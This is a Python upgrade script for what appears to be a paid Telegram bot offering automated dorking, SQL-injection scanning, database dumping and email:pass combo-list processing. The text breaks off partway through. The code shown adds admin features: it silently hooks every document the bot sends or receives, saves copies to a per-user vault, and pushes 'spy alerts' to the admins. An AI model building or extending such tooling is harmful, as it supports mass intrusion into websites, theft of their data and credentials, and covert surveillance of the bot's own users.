#!/usr/bin/env python3
"""
hyper_admin_autopilot_v9.py — Standalone Cumulative V9 Next-Gen Upgrade
========================================================================
Fixes & Supercharges:
  1. Fixes Admin Panel `Server Info` (`admin_serverinfo`) — zero-dependency
     Linux `/proc` + `shutil` telemetry (NEVER crashes on missing `psutil`!),
     shows CPU model/cores/%, System RAM, Bot RAM, Disk GB, Server & Bot Uptime,
     Proxy Guardian Pool breakdown, Active Jobs & User Vault stats + instant Refresh!
  2. Fixes Admin Panel `Live Feed` (`admin_livefeed`) — ALWAYS opens a full
     Real-Time Mission Control screen (fixes post-restart ConversationHandler
     dead-click bug + Markdown escape bug + hooks ALL modules, not just Parser!),
     shows Live Active Jobs + Last 15 User Activities + 1-Click Grab File & Force Stop!
  3. Fixes ConversationHandler Post-Restart Inline Button Dead-Clicks — registers
     `CallbackQueryHandler(button_handler)` in `entry_points` + `fallbacks` so
     EVERY button works immediately after restart without needing `/start` first!
  4. NEW Admin Feature — `📂 User Files Vault` (`admin_uservault` / `/userfiles`):
     Automatically captures & indexes EVERY file uploaded by ANY user (`📥 IN`)
     AND EVERY output/dump file sent to ANY user (`📤 OUT`) in `data/user_vault/`,
     with full per-user browser, filter tabs (`All / Uploads / Outputs`),
     `👁️ 25-Line Preview`, `⬇️ 1-Click Instant Download`, & `📦 Full User .ZIP`!
  5. NEW Admin Feature — `🔔 Live Spy Alerts ON/OFF`: Instant push alert to Admin
     whenever any user uploads a file or finishes a scan/dump, with 1-Click Grab button!
  6. NEW Top-Level Main Menu Feature — `🚀 Auto-Pilot Pipeline` (`/autopilot`):
     1-Click end-to-end autonomous `Topic/Seeds -> Keywords -> HQ Dorks ->
     Multi-Engine Proxy Parser -> Multi-Check SQLi Scanner -> ALL-Data ZIP Dumper`!
  7. NEW Top-Level Main Menu Feature — `🧰 Combo & URL Refinery` (`/cleaner`):
     1-Click processing on huge `.txt`/`.zip` files: Clean Injectable Param URLs,
     Ultra-Fast Dedup, `email:pass` + Provider Split `.ZIP`, & Domain Extractor!
"""

import os
import py_compile
import re
import shutil
import subprocess
import sys
from datetime import datetime

MARKER_V9 = "# ==================== V9 HYPER ADMIN VAULT + LIVE FEED + AUTOPILOT ENGINE ===================="

V9_ENGINE_BLOCK = r'''
# ==================== V9 HYPER ADMIN VAULT + LIVE FEED + AUTOPILOT ENGINE ====================
import os as _v9_os
import io as _v9_io
import re as _v9_re
import json as _v9_json
import time as _v9_time
import html as _v9_html
import uuid as _v9_uuid
import shutil as _v9_shutil
import zipfile as _v9_zipfile
import platform as _v9_platform
import urllib.parse as _v9_urlparse
from pathlib import Path as _v9_Path

AUTOPILOT_WAIT_INPUT = 994
REFINERY_WAIT_FILE   = 995

_V9_BOOT_TS = _v9_time.time()
_V9_VAULT_DIR = _v9_Path("data/user_vault")
_V9_VAULT_DIR.mkdir(parents=True, exist_ok=True)
_V9_VAULT_INDEX_FILE = _V9_VAULT_DIR / "index.json"
_V9_SPY_CFG_FILE = _v9_Path("data/admin_spy.json")

_V9_RECENT_EVENTS: list[dict] = []   # Ring buffer of recent actions across ALL modules
_V9_VAULT_INDEX: list[dict] = []     # Persistent list of file records
_V9_CPU_SNAPSHOT: list[tuple[int, int]] = []  # [(idle, total)] for exact instant CPU%


# ── Fix V8 sqli_get_urls_file & url_dump_get_file targets cleanly ─────────────
async def sqli_get_urls_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    raw_text = await _v9_download_and_vault_doc(update, context)
    urls = [u.strip() for u in raw_text.splitlines() if u.strip().startswith("http")]
    if not urls:
        await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. URLs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http/https.")
        return SQLI_WAIT_URLS
    if len(urls) > 500_000:
        urls = urls[:500_000]
    return await _run_sqli(update, context, urls)


async def url_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    raw_text = await _v9_download_and_vault_doc(update, context)
    urls = [u.strip() for u in raw_text.splitlines() if u.strip().startswith("http")]
    if not urls:
        await update.message.reply_text("❌ No URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http.")
        return URL_DUMP_WAIT
    if len(urls) > 500_000:
        urls = urls[:500_000]
    return await _run_dump_pipeline(update, context, [], prefound_urls=urls)


def _v9_md_safe(val) -> str:
    """Escape Telegram legacy Markdown v1 special chars so edit_message_text NEVER fails!"""
    s = str(val if val is not None else "")
    for ch in ("\\", "`", "*", "_", "["):
        s = s.replace(ch, "")
    return s.strip() or "Unknown"


def _v9_fmt_bytes(num_bytes: int | float) -> str:
    n = float(max(0, num_bytes))
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024.0 or unit == "TB":
            return f"{n:.1f} {unit}" if unit != "B" else f"{int(n)} B"
        n /= 1024.0
    return f"{n:.1f} TB"


def _v9_fmt_duration(seconds: float) -> str:
    s = max(0, int(seconds))
    d, rem = divmod(s, 86400)
    h, rem = divmod(rem, 3600)
    m, sec = divmod(rem, 60)
    if d > 0:
        return f"{d}d {h}h {m}m"
    if h > 0:
        return f"{h}h {m}m {sec}s"
    if m > 0:
        return f"{m}m {sec}s"
    return f"{sec}s"


def _v9_progress_bar(pct: float, width: int = 14) -> str:
    pct = max(0.0, min(100.0, pct))
    filled = int(round((pct / 100.0) * width))
    return "█" * filled + "░" * (width - filled)


# ── Persistent Spy Config & Vault Index ───────────────────────────────────────
def _v9_is_spy_enabled() -> bool:
    try:
        if _V9_SPY_CFG_FILE.exists():
            return bool(_v9_json.loads(_V9_SPY_CFG_FILE.read_text("utf-8")).get("enabled", True))
    except Exception:
        pass
    return True


def _v9_set_spy_enabled(enabled: bool) -> None:
    try:
        _V9_SPY_CFG_FILE.parent.mkdir(parents=True, exist_ok=True)
        _V9_SPY_CFG_FILE.write_text(_v9_json.dumps({"enabled": bool(enabled)}, indent=2), "utf-8")
    except Exception:
        pass


def _v9_load_vault_index() -> None:
    global _V9_VAULT_INDEX
    try:
        if _V9_VAULT_INDEX_FILE.exists():
            data = _v9_json.loads(_V9_VAULT_INDEX_FILE.read_text("utf-8"))
            if isinstance(data, list):
                _V9_VAULT_INDEX = data[-3000:]
    except Exception:
        _V9_VAULT_INDEX = []


def _v9_save_vault_index() -> None:
    try:
        _V9_VAULT_DIR.mkdir(parents=True, exist_ok=True)
        tmp = _V9_VAULT_DIR / "index.json.tmp"
        tmp.write_text(_v9_json.dumps(_V9_VAULT_INDEX[-3000:], ensure_ascii=False), "utf-8")
        tmp.replace(_V9_VAULT_INDEX_FILE)
    except Exception:
        pass


_v9_load_vault_index()


def _v9_user_meta_lookup(uid: int) -> tuple[str, str]:
    """Best-effort name & @username lookup across vault history and live feed."""
    for rec in reversed(_V9_VAULT_INDEX):
        if int(rec.get("uid", 0)) == int(uid):
            nm = rec.get("name") or ""
            un = rec.get("username") or ""
            if nm or un:
                return nm or f"User {uid}", un
    lf = _LIVE_FEED.get(uid) or {}
    if lf.get("name"):
        return str(lf["name"]), str(lf.get("username", ""))
    return f"User {uid}", ""


def _v9_log_activity(uid: int, name: str, username: str, module: str, detail: str, file_id_key: str = "") -> None:
    _V9_RECENT_EVENTS.append({
        "ts": datetime.now().strftime("%H:%M:%S"),
        "date": datetime.now().strftime("%d-%b %H:%M"),
        "uid": int(uid),
        "name": _v9_md_safe(name or f"User {uid}"),
        "username": _v9_md_safe(username),
        "module": _v9_md_safe(module),
        "detail": _v9_md_safe(detail),
        "fid": file_id_key,
    })
    if len(_V9_RECENT_EVENTS) > 80:
        del _V9_RECENT_EVENTS[:-80]


def _v9_record_vault_file(
    *,
    uid: int,
    name: str = "",
    username: str = "",
    direction: str = "OUT",
    filename: str = "file.txt",
    raw_bytes: bytes | None = None,
    tg_file_id: str = "",
    caption: str = "",
) -> dict:
    """Save file to `data/user_vault/<uid>/` + index metadata for instant Admin access!"""
    uid = int(uid or 0)
    if not name:
        name, username_cached = _v9_user_meta_lookup(uid)
        username = username or username_cached
    fid = _v9_uuid.uuid4().hex[:10]
    safe_fn = _v9_re.sub(r"[^A-Za-z0-9._-]+", "_", filename or "file.txt")[-90:]
    user_folder = _V9_VAULT_DIR / str(uid)
    user_folder.mkdir(parents=True, exist_ok=True)
    disk_name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{direction.lower()}_{fid}_{safe_fn}"
    disk_path = user_folder / disk_name

    size_bytes = 0
    line_count = 0
    if raw_bytes is not None:
        size_bytes = len(raw_bytes)
        try:
            # Cap single mirrored copy on disk at 120 MB to keep VPS disk clean
            if size_bytes <= 120 * 1024 * 1024:
                disk_path.write_bytes(raw_bytes)
            if safe_fn.lower().endswith((".txt", ".csv", ".sql", ".log", ".json")):
                line_count = raw_bytes.count(b"\n") + (1 if raw_bytes and not raw_bytes.endswith(b"\n") else 0)
            elif safe_fn.lower().endswith(".zip"):
                try:
                    with _v9_zipfile.ZipFile(_v9_io.BytesIO(raw_bytes), "r") as zf:
                        for zn in zf.namelist():
                            if not zn.endswith("/"):
                                line_count += zf.read(zn).count(b"\n")
                except Exception:
                    pass
        except Exception:
            pass

    rec = {
        "id": fid,
        "uid": uid,
        "name": _v9_md_safe(name),
        "username": _v9_md_safe(username) if username else "",
        "dir": direction,  # "IN" or "OUT"
        "filename": safe_fn,
        "path": str(disk_path) if disk_path.exists() else "",
        "tg_file_id": tg_file_id or "",
        "size": size_bytes,
        "lines": line_count,
        "caption": _v9_md_safe((caption or "")[:120]),
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    _V9_VAULT_INDEX.append(rec)
    _v9_save_vault_index()
    _v9_log_activity(
        uid=uid,
        name=name,
        username=username,
        module="📥 Upload" if direction == "IN" else "📤 Output",
        detail=f"{safe_fn} ({_v9_fmt_bytes(size_bytes)})",
        file_id_key=fid,
    )
    return rec


async def _v9_notify_admins_spy(bot, rec: dict) -> None:
    """Send live Spy notification to Admins when non-admin users upload or generate files."""
    if not _v9_is_spy_enabled():
        return
    uid = int(rec.get("uid", 0))
    admin_ids = set()
    try:
        if isinstance(ADMIN_IDS, (list, set, tuple)):
            admin_ids.update(int(x) for x in ADMIN_IDS)
    except Exception:
        pass
    try:
        if "OWNER_ID" in globals() and OWNER_ID:
            admin_ids.add(int(OWNER_ID))
    except Exception:
        pass
    if not admin_ids or uid in admin_ids or uid <= 0:
        return

    arrow = "📥 *Uᴘʟᴏᴀᴅᴇᴅ Fɪʟᴇ*" if rec["dir"] == "IN" else "📤 *Gᴇɴᴇʀᴀᴛᴇᴅ / Dᴜᴍᴘᴇᴅ Fɪʟᴇ*"
    uname_str = f" (@{rec['username']})" if rec.get("username") else ""
    lines_str = f" • `{rec['lines']:,}` lines" if rec.get("lines") else ""
    text = (
        f"🕵️ *Lɪᴠᴇ Sᴘʏ Aʟᴇʀᴛ* — {arrow}\n"
        f"👤 Usᴇʀ: *{rec['name']}*{uname_str} (`{uid}`)\n"
        f"📄 Fɪʟᴇ: `{rec['filename']}`\n"
        f"📦 Sɪᴢᴇ: `{_v9_fmt_bytes(rec['size'])}`{lines_str}"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("⬇️ Grab File", callback_data=f"uv_dl_{rec['id']}"),
        InlineKeyboardButton("📂 User Vault", callback_data=f"uv_u_{uid}_A_0"),
    ]])
    for aid in admin_ids:
        try:
            await bot.send_message(chat_id=aid, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb, disable_notification=True)
        except Exception:
            pass


# ── Automatic Global Hooks on ALL Incoming Uploads & ALL Outgoing Documents ──
async def _v9_download_and_vault_doc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> str:
    """Download `.txt`/`.zip`/etc., vault raw file under user's ID, and return decoded lines!"""
    doc = update.message.document
    user = update.effective_user
    tg_file = await context.bot.get_file(doc.file_id)
    raw_bytes = bytes(await tg_file.download_as_bytearray())
    fname = doc.file_name or "uploaded.txt"
    rec = _v9_record_vault_file(
        uid=user.id if user else 0,
        name=(user.full_name if user else ""),
        username=(user.username if user else ""),
        direction="IN",
        filename=fname,
        raw_bytes=raw_bytes,
        tg_file_id=doc.file_id,
        caption=update.message.caption or "User Uploaded Document",
    )
    asyncio.create_task(_v9_notify_admins_spy(context.bot, rec))

    if fname.lower().endswith(".zip") or raw_bytes[:4] == b"PK\x03\x04":
        parts = []
        try:
            with _v9_zipfile.ZipFile(_v9_io.BytesIO(raw_bytes), "r") as zf:
                for zn in zf.namelist():
                    if not zn.endswith("/"):
                        parts.append(zf.read(zn).decode("utf-8", errors="ignore"))
            if parts:
                return "\n".join(parts)
        except Exception:
            pass
    return raw_bytes.decode("utf-8", errors="ignore")


# Upgrade V8 helper too so every V8 handler (`Parser`, `Keywords`, `Dorks`, `AllDump`, `/dkeywords`) vaults uploads!
async def _v8_download_doc_text(context: ContextTypes.DEFAULT_TYPE, doc) -> str:
    tg_file = await context.bot.get_file(doc.file_id)
    raw_bytes = bytes(await tg_file.download_as_bytearray())
    fname = getattr(doc, "file_name", None) or "uploaded.txt"
    # Attribute to active user when known
    uid_guess = 0
    try:
        uid_guess = int(getattr(context, "_user_id_and_data", (0, None))[0] or 0)
    except Exception:
        uid_guess = 0
    rec = _v9_record_vault_file(
        uid=uid_guess,
        direction="IN",
        filename=fname,
        raw_bytes=raw_bytes,
        tg_file_id=doc.file_id,
        caption="Uploaded Input File",
    )
    if uid_guess:
        asyncio.create_task(_v9_notify_admins_spy(context.bot, rec))
    if fname.lower().endswith(".zip") or raw_bytes[:4] == b"PK\x03\x04":
        parts = []
        try:
            with _v9_zipfile.ZipFile(_v9_io.BytesIO(raw_bytes), "r") as zf:
                for zn in zf.namelist():
                    if not zn.endswith("/"):
                        parts.append(zf.read(zn).decode("utf-8", errors="ignore"))
            if parts:
                return "\n".join(parts)
        except Exception:
            pass
    return raw_bytes.decode("utf-8", errors="ignore")


def _v9_install_telegram_document_vault_hooks() -> None:
    """Hook `Message.reply_document` and `Bot.send_document` ONCE so 100% of bot outputs are vaulted!"""
    from telegram import Message as _TGMessage, Bot as _TGBot

    if getattr(_TGMessage, "_v9_vault_hooked", False):
        return

    _orig_reply_doc = _TGMessage.reply_document
    _orig_send_doc = _TGBot.send_document

    def _extract_bytes_and_rewind(doc_arg):
        if isinstance(doc_arg, (bytes, bytearray)):
            return bytes(doc_arg), _v9_io.BytesIO(bytes(doc_arg))
        if hasattr(doc_arg, "read") and hasattr(doc_arg, "seek"):
            try:
                pos = doc_arg.tell() if hasattr(doc_arg, "tell") else 0
                raw = doc_arg.read()
                doc_arg.seek(pos)
                if isinstance(raw, str):
                    raw = raw.encode("utf-8", errors="ignore")
                return bytes(raw), doc_arg
            except Exception:
                return None, doc_arg
        if isinstance(doc_arg, (str, _v9_Path)) and _v9_os.path.isfile(str(doc_arg)):
            try:
                return _v9_Path(str(doc_arg)).read_bytes(), doc_arg
            except Exception:
                return None, doc_arg
        return None, doc_arg

    async def _vaulted_reply_document(self, document, filename=None, caption=None, *args, **kwargs):
        raw_bytes, rewound_doc = _extract_bytes_and_rewind(document)
        sent_msg = await _orig_reply_doc(self, rewound_doc, filename=filename, caption=caption, *args, **kwargs)
        try:
            if not kwargs.get("_v9_skip_vault", False):
                target_user = getattr(self, "from_user", None)
                chat_id = getattr(self, "chat_id", 0) or (target_user.id if target_user else 0)
                tg_fid = sent_msg.document.file_id if getattr(sent_msg, "document", None) else ""
                real_name = filename or (sent_msg.document.file_name if getattr(sent_msg, "document", None) else "output.txt")
                rec = _v9_record_vault_file(
                    uid=int(chat_id),
                    name=(target_user.full_name if target_user and target_user.id == chat_id else ""),
                    username=(target_user.username if target_user and target_user.id == chat_id else ""),
                    direction="OUT",
                    filename=real_name or "output.txt",
                    raw_bytes=raw_bytes,
                    tg_file_id=tg_fid,
                    caption=caption or "",
                )
                asyncio.create_task(_v9_notify_admins_spy(self.get_bot(), rec))
        except Exception:
            pass
        return sent_msg

    async def _vaulted_send_document(self, chat_id, document, filename=None, caption=None, *args, **kwargs):
        skip_vault = bool(kwargs.pop("_v9_skip_vault", False))
        raw_bytes, rewound_doc = _extract_bytes_and_rewind(document)
        sent_msg = await _orig_send_doc(self, chat_id, rewound_doc, filename=filename, caption=caption, *args, **kwargs)
        try:
            if not skip_vault and isinstance(chat_id, int):
                # Skip vaulting Admin's own Vault downloads or Get Bot File exports
                fn_check = (filename or (sent_msg.document.file_name if getattr(sent_msg, "document", None) else "")).lower()
                if not fn_check.startswith("spidey_bot_"):
                    tg_fid = sent_msg.document.file_id if getattr(sent_msg, "document", None) else ""
                    rec = _v9_record_vault_file(
                        uid=int(chat_id),
                        direction="OUT",
                        filename=filename or fn_check or "output.txt",
                        raw_bytes=raw_bytes,
                        tg_file_id=tg_fid,
                        caption=caption or "",
                    )
                    asyncio.create_task(_v9_notify_admins_spy(self, rec))
        except Exception:
            pass
        return sent_msg

    _TGMessage.reply_document = _vaulted_reply_document
    _TGBot.send_document = _vaulted_send_document
    _TGMessage._v9_vault_hooked = True


_v9_install_telegram_document_vault_hooks()


# ── Zero-Dependency Real Linux `/proc` + Disk Server Telemetry Engine ─────────
def _v9_collect_server_telemetry() -> dict:
    """100% Native Linux `/proc` + `os` + `shutil` reader (NEVER crashes if `psutil` is absent!)."""
    info = {
        "py_ver": _v9_platform.python_version(),
        "os_label": f"{_v9_platform.system()} {_v9_platform.release()}",
        "cpu_cores": _v9_os.cpu_count() or 1,
        "cpu_model": "Server vCPU",
        "cpu_pct": 0.0,
        "load_1": 0.0,
        "load_5": 0.0,
        "load_15": 0.0,
        "sys_ram_total_mb": 0.0,
        "sys_ram_used_mb": 0.0,
        "sys_ram_pct": 0.0,
        "bot_ram_mb": 0.0,
        "disk_total_gb": 0.0,
        "disk_used_gb": 0.0,
        "disk_free_gb": 0.0,
        "disk_pct": 0.0,
        "server_uptime": "N/A",
        "bot_uptime": _v9_fmt_duration(_v9_time.time() - _V9_BOOT_TS),
    }

    # 1. CPU model
    try:
        with open("/proc/cpuinfo", "r", errors="ignore") as f:
            for ln in f:
                if ln.lower().startswith("model name") and ":" in ln:
                    info["cpu_model"] = ln.split(":", 1)[1].strip()[:40]
                    break
    except Exception:
        pass

    # 2. Load average
    try:
        l1, l5, l15 = _v9_os.getloadavg()
        info["load_1"], info["load_5"], info["load_15"] = l1, l5, l15
    except Exception:
        pass

    # 3. Live CPU % from /proc/stat delta (or psutil if installed)
    try:
        def _read_cpu_stat():
            with open("/proc/stat", "r") as f:
                nums = [int(x) for x in f.readline().split()[1:]]
            idle = nums[3] + (nums[4] if len(nums) > 4 else 0)
            return idle, sum(nums)

        i1, t1 = _read_cpu_stat()
        if _V9_CPU_SNAPSHOT:
            prev_i, prev_t = _V9_CPU_SNAPSHOT[-1]
            dt = t1 - prev_t
            di = i1 - prev_i
            if dt > 0:
                info["cpu_pct"] = max(0.0, min(100.0, (1.0 - (di / dt)) * 100.0))
        else:
            info["cpu_pct"] = min(100.0, (info["load_1"] / max(1, info["cpu_cores"])) * 100.0)
        _V9_CPU_SNAPSHOT[:] = [(i1, t1)]
    except Exception:
        pass

    # 4. System RAM from /proc/meminfo
    try:
        mem = {}
        with open("/proc/meminfo", "r") as f:
            for ln in f:
                parts = ln.split()
                if len(parts) >= 2:
                    mem[parts[0].rstrip(":")] = int(parts[1])  # kB
        total_kb = mem.get("MemTotal", 0)
        avail_kb = mem.get("MemAvailable", mem.get("MemFree", 0))
        used_kb = max(0, total_kb - avail_kb)
        info["sys_ram_total_mb"] = total_kb / 1024.0
        info["sys_ram_used_mb"] = used_kb / 1024.0
        info["sys_ram_pct"] = (used_kb / total_kb * 100.0) if total_kb else 0.0
    except Exception:
        pass

    # 5. Bot Process RSS RAM from /proc/self/status
    try:
        with open("/proc/self/status", "r") as f:
            for ln in f:
                if ln.startswith("VmRSS:"):
                    info["bot_ram_mb"] = int(ln.split()[1]) / 1024.0
                    break
    except Exception:
        pass

    # 6. Disk Usage via stdlib `shutil.disk_usage`
    try:
        du = _v9_shutil.disk_usage(".")
        info["disk_total_gb"] = du.total / (1024 ** 3)
        info["disk_used_gb"] = du.used / (1024 ** 3)
        info["disk_free_gb"] = du.free / (1024 ** 3)
        info["disk_pct"] = (du.used / du.total * 100.0) if du.total else 0.0
    except Exception:
        pass

    # 7. Server Uptime from /proc/uptime
    try:
        with open("/proc/uptime", "r") as f:
            up_sec = float(f.read().split()[0])
        info["server_uptime"] = _v9_fmt_duration(up_sec)
    except Exception:
        pass

    return info


def _v9_build_serverinfo_view() -> tuple[str, InlineKeyboardMarkup]:
    t = _v9_collect_server_telemetry()
    active_tasks = len([x for x in asyncio.all_tasks() if not x.done()])
    active_paid = sum(1 for v in authorized_users.values() if datetime.now() < v.get("expires", datetime.min))
    px_total = len(global_proxy_pool)
    px_detail = ""
    if "_v7_proxy_breakdown" in globals():
        c = _v7_proxy_breakdown()
        if isinstance(c, dict):
            px_detail = f" (`H:{c.get('http',0)} | S5:{c.get('socks5',0)} | S4:{c.get('socks4',0)}`)"
        elif isinstance(c, (tuple, list)) and len(c) >= 3:
            px_detail = f" (`H:{c[0]} | S5:{c[1]} | S4:{c[2]}`)"
    vault_bytes = sum(int(r.get("size", 0)) for r in _V9_VAULT_INDEX)

    txt = (
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "🛰️ *𝙎𝙚𝙧𝙫𝙚𝙧 𝙄𝙣𝙛𝙤 — 𝙇𝙞𝙫𝙚 𝙏𝙚𝙡𝙚𝙢𝙚𝙩𝙧𝙮*\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🖥️ *CPU:* `{_v9_md_safe(t['cpu_model'])}`\n"
        f"⚡ *Cᴏʀᴇs & Lᴏᴀᴅ:* `{t['cpu_cores']} Cores` | `{t['cpu_pct']:.1f}%` (`{t['load_1']:.2f}, {t['load_5']:.2f}, {t['load_15']:.2f}`)\n"
        f"`[{_v9_progress_bar(t['cpu_pct'])}]` `{t['cpu_pct']:.1f}%`\n\n"
        f"🧠 *Sʏsᴛᴇᴍ RAM:* `{t['sys_ram_used_mb']/1024:.2f} GB / {t['sys_ram_total_mb']/1024:.2f} GB`\n"
        f"`[{_v9_progress_bar(t['sys_ram_pct'])}]` `{t['sys_ram_pct']:.1f}%`\n"
        f"🕷️ *Bᴏᴛ Pʀᴏᴄᴇss RAM:* `{t['bot_ram_mb']:.1f} MB` | PID `{_v9_os.getpid()}`\n\n"
        f"💾 *NVMe / Dɪsᴋ:* `{t['disk_used_gb']:.1f} GB / {t['disk_total_gb']:.1f} GB` (`{t['disk_free_gb']:.1f} GB Free`)\n"
        f"`[{_v9_progress_bar(t['disk_pct'])}]` `{t['disk_pct']:.1f}%`\n\n"
        f"⏱️ *Bᴏᴛ Uᴘᴛɪᴍᴇ:* `{t['bot_uptime']}` | *VPS:* `{t['server_uptime']}`\n"
        f"🐍 *Rᴜɴᴛɪᴍᴇ:* `Python {t['py_ver']}` • `{active_tasks}` Async Tasks\n"
        f"🌊 *Pʀᴏxʏ Pᴏᴏʟ:* `{px_total:,}`{px_detail}\n"
        f"👥 *Usᴇʀs:* `{len(all_user_ids)}` Known | `{active_paid}` Active | `{len(banned_users)}` Banned\n"
        f"📂 *Usᴇʀ Vᴀᴜʟᴛ:* `{len(_V9_VAULT_INDEX):,}` Files (`{_v9_fmt_bytes(vault_bytes)}`)\n"
        f"🕒 *Uᴘᴅᴀᴛᴇᴅ:* `{datetime.now().strftime('%H:%M:%S')}`"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Rᴇғʀᴇsʜ Lɪᴠᴇ", callback_data="admin_serverinfo"),
         InlineKeyboardButton("👁️ Lɪᴠᴇ Fᴇᴇᴅ", callback_data="admin_livefeed")],
        [InlineKeyboardButton("📂 Usᴇʀ Fɪʟᴇs Vᴀᴜʟᴛ", callback_data="uv_home_0"),
         InlineKeyboardButton("⬅️ Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")],
    ])
    return txt, kb


# ── Real-Time Mission Control Live Feed (Works 100% Even When Idle!) ─────────
def _v9_build_livefeed_view() -> tuple[str, InlineKeyboardMarkup]:
    spy_state = "🟢 ON" if _v9_is_spy_enabled() else "🔴 OFF"
    lines = [
        "⚔️━━━━━━━━━━━━━━━━━━━━━━⚔️",
        "👁️ *𝙇𝙞𝙫𝙚 𝙁𝙚𝙚𝙙 — 𝙈𝙞𝙨𝙨𝙞𝙤𝙣 𝘾𝙤𝙣𝙩𝙧𝙤𝙡*",
        "⚔️━━━━━━━━━━━━━━━━━━━━━━⚔️",
        f"🕒 `{datetime.now().strftime('%H:%M:%S')}` • 🔔 Spy Alerts: *{spy_state}*\n",
    ]
    btn_rows = []

    if _LIVE_FEED:
        lines.append(f"🔥 *Aᴄᴛɪᴠᴇ Rᴜɴɴɪɴɢ Jᴏʙs (`{len(_LIVE_FEED)}`)*:")
        for idx, (sid, s) in enumerate(list(_LIVE_FEED.items()), 1):
            nm = _v9_md_safe(s.get("name", f"User {sid}"))
            ph = _v9_md_safe(s.get("phase", "Running"))
            st = _v9_md_safe(s.get("start", "--:--"))
            done = int(s.get("dorks_done", 0) or 0)
            tot = int(s.get("dorks_total", 0) or 0)
            found = int(s.get("urls_found", 0) or 0)
            pct = int(done * 100 / tot) if tot > 0 else 0
            lines.append(
                f"*{idx}. {nm}* (`{sid}`)\n"
                f"   ⚡ {ph} • Since `{st}`\n"
                f"   📊 `{done:,}/{tot:,}` (`{pct}%`) • Hits/URLs: `{found:,}`"
            )
            btn_rows.append([
                InlineKeyboardButton(f"🛑 Stop {nm[:14]}", callback_data=f"lf_kill_{sid}"),
                InlineKeyboardButton("📂 User Files", callback_data=f"uv_u_{sid}_A_0"),
            ])
    else:
        lines.append("💤 *Aᴄᴛɪᴠᴇ Jᴏʙs:* `0 running right now`")

    lines.append("\n📜 *Rᴇᴄᴇɴᴛ Usᴇʀ & Bᴏᴛ Aᴄᴛɪᴠɪᴛʏ:*")
    recent = list(reversed(_V9_RECENT_EVENTS[-10:]))
    if not recent:
        lines.append("  • _Abhi tak koi nayi user activity record nahi hui._")
    else:
        dl_quick = []
        for idx, ev in enumerate(recent, 1):
            lines.append(
                f"`{ev['ts']}` • *{ev['name']}* (`{ev['uid']}`)\n"
                f"   └ {ev['module']}: `{ev['detail'][:44]}`"
            )
            if ev.get("fid") and len(dl_quick) < 4:
                dl_quick.append(InlineKeyboardButton(f"⬇️ #{idx}", callback_data=f"uv_dl_{ev['fid']}"))
        if dl_quick:
            btn_rows.append(dl_quick)

    btn_rows.append([
        InlineKeyboardButton("🔄 Refresh Feed", callback_data="admin_livefeed"),
        InlineKeyboardButton(f"🔔 Spy: {spy_state}", callback_data="admin_spytoggle"),
    ])
    btn_rows.append([
        InlineKeyboardButton("📂 User Files Vault", callback_data="uv_home_0"),
        InlineKeyboardButton("⬅️ Admin Panel", callback_data="admin_panel"),
    ])
    return "\n".join(lines), InlineKeyboardMarkup(btn_rows)


# ── 📂 ADMIN USER FILES VAULT UI & DOWNLOADER (`uv_*`) ───────────────────────
def _v9_get_vault_record(fid: str) -> dict | None:
    for r in reversed(_V9_VAULT_INDEX):
        if r.get("id") == fid:
            return r
    return None


def _v9_build_vault_home(page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    by_user: dict[int, dict] = {}
    for r in _V9_VAULT_INDEX:
        uid = int(r.get("uid", 0))
        entry = by_user.setdefault(uid, {
            "uid": uid,
            "name": r.get("name") or f"User {uid}",
            "username": r.get("username") or "",
            "in": 0,
            "out": 0,
            "bytes": 0,
            "last_ts": "",
        })
        if r.get("name") and not str(r.get("name")).startswith("User "):
            entry["name"] = r["name"]
        if r.get("username"):
            entry["username"] = r["username"]
        if r.get("dir") == "IN":
            entry["in"] += 1
        else:
            entry["out"] += 1
        entry["bytes"] += int(r.get("size", 0))
        entry["last_ts"] = r.get("ts", "")

    users_sorted = sorted(by_user.values(), key=lambda x: x["last_ts"], reverse=True)
    total_files = len(_V9_VAULT_INDEX)
    total_bytes = sum(x["bytes"] for x in users_sorted)

    per_page = 6
    max_page = max(0, (len(users_sorted) - 1) // per_page)
    page = max(0, min(page, max_page))
    chunk = users_sorted[page * per_page : (page + 1) * per_page]

    lines = [
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎",
        "📂 *𝙐𝙨𝙚𝙧 𝙁𝙞𝙡𝙚𝙨 𝙑𝙖𝙪𝙡𝙩 — Admin Access*",
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n",
        f"👥 *Usᴇʀs Wɪᴛʜ Fɪʟᴇs:* `{len(users_sorted)}`",
        f"📄 *Tᴏᴛᴀʟ Vᴀᴜʟᴛᴇᴅ Fɪʟᴇs:* `{total_files:,}` (`{_v9_fmt_bytes(total_bytes)}`)",
        "💡 _Har user ki uploaded input (.txt/.zip) aur generated/dumped output files yahan live save hoti hain!_\n",
    ]

    latest5 = list(reversed(_V9_VAULT_INDEX[-5:]))
    if latest5:
        lines.append("⚡ *Lᴀᴛᴇsᴛ 5 Fɪʟᴇs Aᴄʀᴏss Aʟʟ Usᴇʀs:*")
        for i, r in enumerate(latest5, 1):
            icon = "📥" if r.get("dir") == "IN" else "📤"
            lines.append(
